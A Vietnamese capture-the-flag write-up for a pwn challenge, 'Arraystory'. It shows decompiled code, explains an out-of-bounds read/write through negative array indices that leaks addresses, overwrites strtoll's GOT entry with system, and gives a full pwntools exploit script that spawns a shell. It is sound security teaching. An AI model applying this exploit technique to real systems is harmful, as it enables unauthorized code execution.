# Arraystory

1 chall khá khó và phức tạp đấy chứ

trước khi bắt tay vào làm thì ta cần học qua **OOB(Out-of-Bounds)** thì mới làm được

**ida:**

```c 

int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r15
  __int64 v4; // rax
  __int64 v6[100]; // [rsp+0h] [rbp-3C8h]
  char s[104]; // [rsp+320h] [rbp-A8h] BYREF
  unsigned __int64 v8; // [rsp+388h] [rbp-40h]

  v8 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Your array has 100 entries");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Read/Write?: ");
      fgets(s, 100, stdin);
      if ( s[0] != 82 )
        break;
      printf("Index: ");
      fgets(s, 100, stdin);
      v4 = strtoll(s, 0LL, 10);
      if ( v4 > 99 )
LABEL_6:
        puts("Invalid index");
      else
        printf("Value: %lld\n", v6[v4]);
    }
    if ( s[0] != 87 )
      break;
    printf("Index: ");
    fgets(s, 100, stdin);
    v3 = strtoll(s, 0LL, 10);
    if ( v3 > 99 )
      goto LABEL_6;
    printf("Value: ");
    fgets(s, 100, stdin);
    v6[v3] = strtoll(s, 0LL, 10);
  }
  puts("Invalid option");
  return 0;
}int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r15
  __int64 v4; // rax
  __int64 v6[100]; // [rsp+0h] [rbp-3C8h]
  char s[104]; // [rsp+320h] [rbp-A8h] BYREF
  unsigned __int64 v8; // [rsp+388h] [rbp-40h]

  v8 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Your array has 100 entries");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Read/Write?: ");
      fgets(s, 100, stdin);
      if ( s[0] != 82 )
        break;
      printf("Index: ");
      fgets(s, 100, stdin);
      v4 = strtoll(s, 0LL, 10);
      if ( v4 > 99 )
LABEL_6:
        puts("Invalid index");
      else
        printf("Value: %lld\n", v6[v4]);
    }
    if ( s[0] != 87 )
      break;
    printf("Index: ");
    fgets(s, 100, stdin);
    v3 = strtoll(s, 0LL, 10);
    if ( v3 > 99 )
      goto LABEL_6;
    printf("Value: ");
    fgets(s, 100, stdin);
    v6[v3] = strtoll(s, 0LL, 10);
  }
  puts("Invalid option");
  return 0;
}

```

## Phân tích

- xem qua ida thì ở đây chương trình cho ta đọc và thay đổi các giá trị trong mảng, **không có lỗi fmt hay BOF gì hết**

- hmm nhưng mà khoan đã để ý thì biến index thì điều kiển là phải bé hơn 100, **nếu vậy thì nếu ta nhập số âm vào thì sẽ có lỗi OOB rồi**, lúc đó ta có thể hoàn toàn leak được các dữ liệu quan trọng hỗ trợ cho việc lấy shell


![image](https://github.com/gookoosss/CTF/assets/128712571/23de3986-c45e-44f5-a88f-c222f4b790cc)



- nhìn sơ thì ko thấy hàm get_shell hay gì hết, nên ta cần phải leak libc , exe, stack rồi

##  Khai thác

ta thấy nếu ta nhập 0 thì nó bắt đầu từ rsp nên giờ ta thử nhập -10 để xem những thứ ta có thể leak được gì nào

![image](https://github.com/gookoosss/CTF/assets/128712571/71d4b9b8-e319-43df-a872-0ec10f1262be)


như ta thấy thì **rsp là 0x7fffffffdd20** tương đương với **index = 0**, nhìn lên trên thì ta thấy tại vị trí **index = -6 thì ta leak được exe, index = -2 thì ta leak được libc, còn index = - 7 thì ta leak được stack** 

### NOTE
```lý do tại sao mình ko index bằng số dương mà lại dùng số âm, đơn giản thôi nếu bạn dùng số dương thì sẽ leak cái giá trị trong mảng của v6, Nhưng mà cái này nó sẽ ko cố định mà thay đổi trong mỗi lần chạy nên sử dụng nó thì rất hên xui may rủi, đó là lý do mình nên cho index bằng số âm```



- à tới đây thì ta leak được rsp nên **ta có thể tính được index trỏ đến got@strtoll** (mình có note bên trong script , các bạn có thể đọc thêm để hiểu)



```python3

#################################
### Stage 1: leak exe address ###
#################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-6')
p.recvuntil(b'Value: ')
exe_leak = int(p.recvline()[:-1], 10)
exe.address = exe_leak - 0x201f
log.info('Exe leak: ' + hex(exe_leak))
log.info('Exe base: ' + hex(exe.address))

##################################
### Stage 2: leak libc address ###
##################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-2')
p.recvuntil(b'Value: ')
libc_leak = int(p.recvline()[:-1], 10)
libc.address = libc_leak - 0x264040
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

##################################
### Stage 3: leak stack rsp    ###
##################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-7')
p.recvuntil(b'Value: ')
stack_leak = int(p.recvline()[:-1], 10)
rsp = stack_leak - 0x320
idx = int(rsp - exe.got['strtoll']) // -8 ### (NOTE)
log.info('stack leak: ' + hex(stack_leak))
log.info('rsp leak: ' + hex(rsp))

# NOTE:

# chỗ này hơi khó hiểu nhưng mà mình sẽ diễn đạt đơn giản là như thế:
# điểm xuất phát là rsp , tương đương với index = 0, bây giờ ta cần thay đổi got@strtoll thì ta cần biết cái index trỏ đến nó
# vì vậy ta sẽ tính offset, sau đó đổi offset thành byte, mà mỗi một index thì là 1 stack, 1 stack thì 8byte, nên ta sẽ chia -8 để tính ra index trỏ đến got@stroll

```

**tới đây thì mình chỉ cần ow got@strtoll thành system, và thay đổi rdi thành /bin/sh nữa là xong**

```python

#####################################
### Stage 4: Overwrite got@stroll ###
#####################################

p.sendlineafter(b'?: ', b'W')
p.sendlineafter(b'Index: ', str(idx))
payload = str(libc.sym['system'])
p.sendlineafter(b'Value: ', payload)

######################################
### Stage 5: change rdi to /bin/sh ###
######################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'/bin/sh\0')


```

### NOTE

**ở đây có ai thắc mắc tại sao mình không dùng got của put, fgets hay hàm nào nó mà lại dùng strtoll ko??**

h thì ta thử debug để hiểu thêm nha

bây giờ ta chọn option Read và nhập cho Value thử 8byte a 

sau đó ta chạy đến hàm strtoll để thấy sự thay đổi:

![image](https://github.com/gookoosss/CTF/assets/128712571/305a4d98-a634-4ed6-98bb-7a74955d8711)


chà, **lúc này hàm strtoll đã gán giá trị ta nhập vào là aaaaaaaa vô rdi rồi**, nếu thay vào đó **ta sẽ nhập /bin/sh\0 vào thì có phải là ta đỡ phải dùng pop_rdi đúng ko??**

- đến đây thì ta lấy được shell rồi nè


![image](https://github.com/gookoosss/CTF/assets/128712571/67c71836-ef45-4b35-a902-dc1626571d88)


### script:

```python

from pwn import *

exe = ELF('./arraystore_patched', checksec = False)
context.binary = exe
p = process('./arraystore_patched')
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')

gdb.attach(p, gdbscript = '''
b*main+337
c      
''')

input()

#################################
### Stage 1: leak exe address ###
#################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-6')
p.recvuntil(b'Value: ')
exe_leak = int(p.recvline()[:-1], 10)
exe.address = exe_leak - 0x201f
log.info('Exe leak: ' + hex(exe_leak))
log.info('Exe base: ' + hex(exe.address))

##################################
### Stage 2: leak libc address ###
##################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-2')
p.recvuntil(b'Value: ')
libc_leak = int(p.recvline()[:-1], 10)
libc.address = libc_leak - 0x264040
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

##################################
### Stage 3: leak stack rsp    ###
##################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'-7')
p.recvuntil(b'Value: ')
stack_leak = int(p.recvline()[:-1], 10)
rsp = stack_leak - 0x320
idx = int(rsp - exe.got['strtoll']) // -8 # (note)
log.info('stack leak: ' + hex(stack_leak))
log.info('rsp leak: ' + hex(rsp))

# NOTE:

# chỗ này hơi khó hiểu nhưng mà mình sẽ diễn đạt đơn giản là như thế:
# điểm xuất phát là rsp , tương đương với index = 0, bây giờ ta cần thay đổi got@strtoll thì ta cần biết cái index trỏ đến nó
# vì vậy ta sẽ tính offset, sau đó đổi offset thành byte, mà mỗi một index thì là 1 stack, 1 stack thì 8byte, nên ta sẽ chia -8 để tính ra index trỏ đến got@stroll

#####################################
### Stage 4: Overwrite got@stroll ###
#####################################

p.sendlineafter(b'?: ', b'W')
p.sendlineafter(b'Index: ', str(idx))
payload = str(libc.sym['system'])
p.sendlineafter(b'Value: ', payload)

######################################
### Stage 5: change rdi to /bin/sh ###
######################################

p.sendlineafter(b'?: ', b'R')
p.sendlineafter(b'Index: ', b'/bin/sh\0')

p.interactive()


```









